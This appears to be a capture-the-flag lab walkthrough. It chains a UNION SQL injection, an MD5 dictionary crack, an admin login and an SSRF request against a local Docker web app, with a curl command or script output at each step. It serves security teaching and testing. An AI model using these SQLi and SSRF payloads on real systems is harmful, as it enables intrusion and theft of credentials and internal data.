# Multi-Stage Web Exploit Chain: Full Walkthrough

## Setup

```
docker compose up --build -d
```

Verify:

```
curl -s http://127.0.0.1:8114/
```

Output: DataSearch Portal home page.

## Step 1: Extract admin hash via UNION SQLi

```
curl -s "http://127.0.0.1:8114/search?q=' UNION SELECT 1, password_hash, role FROM users WHERE role='admin' --"
```

Output:

```json
{"results":[{"id":1,"role":"admin","username":"482c811da5d5b4bc6d497ffa98491e38"}]}
```

The hash is `482c811da5d5b4bc6d497ffa98491e38`.

## Step 2: Crack the hash

```python
import hashlib
h = '482c811da5d5b4bc6d497ffa98491e38'
for pwd in ['password123', 'admin', 'password']:
    if hashlib.md5(pwd.encode()).hexdigest() == h:
        print(pwd)
```

Output: `password123`

## Step 3: Log in as admin

```
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"password123"}' \
  http://127.0.0.1:8114/login
```

Output:

```json
{"flag1":"POC{<hex>}","role":"admin","success":true}
```

**Flag 1** is in the `flag1` field.

## Step 4: SSRF to internal service

```
curl -s -X POST -H 'Content-Type: application/json' -H 'X-Role: admin' \
  -d '{"url":"http://internal.local/secret"}' \
  http://127.0.0.1:8114/import
```

Output:

```json
{"content":"Internal service response","secret":"POC{<hex>}"}
```

**Flag 2** is in the `secret` field.

## Automated exploit

```
python3 exploit/exploit.py http://127.0.0.1:8114
```

Output:

```
[*] Target: http://127.0.0.1:8114

[+] Admin hash leaked via SQLi: 482c811da5d5b4bc6d497ffa98491e38
[+] Hash cracked: 482c811da5d5b4bc6d497ffa98491e38 -> password123
[+] Flag 1: POC{<hex>}
[+] SSRF reached internal service
[+] Flag 2: POC{<hex>}

[+] Exploit complete
    Flag 1: POC{<hex>}
    Flag 2: POC{<hex>}
```

## Full attack chain

```
Unauthenticated HTTP client
  |
  v
GET /search?q=' UNION SELECT 1, password_hash, role FROM users WHERE role='admin' --
  |
  |-- SQL query breaks out of LIKE clause via UNION
  |-- password_hash column returned in username field
  |
  v
Admin hash: 482c811da5d5b4bc6d497ffa98491e38
  |
  v
MD5 dictionary attack: hash -> "password123" (< 1 second)
  |
  v
POST /login  {"username":"admin","password":"password123"}
  |
  |-- MD5(password123) matches stored hash
  |
  v
Admin session established -> Flag 1 captured
  |
  v
POST /import  {"url":"http://internal.local/secret"}  X-Role: admin
  |
  |-- Server fetches internal URL (SSRF)
  |-- Internal service returns secret
  |
  v
Flag 2 captured
```

## Tools used

| Tool | Purpose |
|------|---------|
| curl | Manual SQLi and login requests |
| Python hashlib | Hash cracking (dictionary attack) |
| exploit.py | Automated four-step chain |

## Teardown

```
docker compose down
```
